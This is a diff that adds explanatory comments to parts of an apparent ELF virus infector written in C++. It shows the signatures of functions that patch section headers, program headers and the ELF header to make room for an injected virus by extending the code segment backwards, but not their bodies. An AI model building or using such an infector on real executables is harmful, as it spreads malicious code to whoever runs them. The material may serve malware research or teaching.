@@ -7,6 +7,8 @@
 
 namespace vf::infector {
 namespace {
+// Patch the section header to accommodate the virus, by shifting the
+// section file offsets and extending the virtual memory address reversely.
 void patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
                size_t padded_virus_size,
                Elf64_Off original_code_segment_file_offset,
@@ -87,6 +89,8 @@ void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
   }
 }
 
+// Patch the elf header for account for the shift for both section and program
+// headers.
 void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr original_code_segment_p_vaddr,
                 Elf64_Off original_code_segment_file_offset,
                 uint64_t padded_virus_size) {
@@ -100,6 +104,7 @@ void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr original_code_segment_p_vaddr,
   }
 }
 
+// Returns true if a dynamic section entry contains a specific tag.
 bool does_entry_contain_address(Elf64_Xword tag) {
   // https://codebrowser.dev/glibc/glibc/elf/elf.h.html
   // https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter6-42444.html
